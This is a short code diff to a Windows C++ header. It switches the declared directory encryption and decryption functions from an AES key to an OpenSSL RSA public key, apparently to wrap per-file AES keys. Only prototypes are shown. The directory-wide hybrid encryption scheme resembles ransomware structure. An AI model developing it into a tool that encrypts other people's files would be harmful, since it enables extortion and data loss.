@@ -2,6 +2,7 @@
 #include <windows.h>
 #include <string>
 #include <vector>
+#include <openssl/rsa.h>
 #include "AES.hpp"
 
 #define UNLEN 128
@@ -10,14 +11,13 @@ using namespace std;
 
 string getUserName();
 
-void EncryptDir(unsigned char* key, string& dirName);
+void EncryptDir(RSA* pubKey, string& dirName);
 
 void EncryptFileByAES(unsigned char* key, string& dirName, string& fileName);
 
 void EncryptText(unsigned char* plain, unsigned int plainLength, unsigned char* key, unsigned char* cipher);
 
-
-void DecryptDir(unsigned char* key, string& dirName);
+void DecryptDir(RSA* pubKey, string& dirName);
 
 void DecryptFileByAES(unsigned char* key, string& dirName, string& fileName);
 
